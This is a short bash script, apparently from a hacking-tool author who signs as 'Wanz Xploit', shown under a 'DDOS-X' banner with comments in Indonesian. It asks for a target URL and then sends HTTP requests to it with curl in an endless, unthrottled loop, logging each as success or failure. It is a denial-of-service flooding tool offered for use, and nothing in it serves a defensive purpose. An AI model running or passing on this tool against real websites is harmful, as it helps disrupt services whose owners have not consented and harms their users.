#!/bin/bash

clear

# Fungsi untuk mencetak teks dengan warna
print_color() {
    echo -e "$1$2\033[0m"
}

# Warna merah (31) dan putih (37)
RED="\033[31m"
WHITE="\033[37m"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'

# Bagian atas dengan warna merah
print_color "$RED" "██████╗ ██████╗  ██████╗ ███████╗     ██╗  ██╗"
print_color "$RED" "██╔══██╗██╔══██╗██╔═══██╗██╔════╝     ╚██╗██╔╝"
print_color "$RED" "██║  ██║██║  ██║██║   ██║███████╗█████╗╚███╔╝ "
print_color "$WHITE" "██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔██╗ "
print_color "$WHITE" "██████╔╝██████╔╝╚██████╔╝███████║     ██╔╝ ██╗"
print_color "$WHITE" "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝     ╚═╝  ╚═╝"
echo
# Function to print separator line
function print_separator {
echo "—————————————————————————————————————————————————"
}
# Display information
print_separator 
echo -e "\033[1;33mAuthor: Wanz Xploit\033[0m"
echo -e "\033[1;33mInstagram: \033[4mhttps://www.instagram.com/wanz_xploit/\033[0m"
echo -e "\033[1;33mFacebook: \033[4mhttps://www.facebook.com/wanzxploit/\033[0m"
echo -e "\033[1;33mYouTube: \033[4mhttps://www.youtube.com/c/WanzXploit\033[0m"
echo -e "\033[1;33mGitHub: \033[4mhttps://github.com/wanzxploit\033[0m"
print_separator
echo
# Minta pengguna memasukkan URL
read -p "Masukkan URL target: " url
echo
# Loop tanpa batas untuk mengirim request dan menampilkan hasil dengan warna
while true; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "$url")
    if [ "$response" -eq 200 ]; then
        echo -e "\033[32mSukses\033[0m: Request ke $url"
    else
        echo -e "\033[31mGagal\033[0m: Request ke $url"
    fi
done
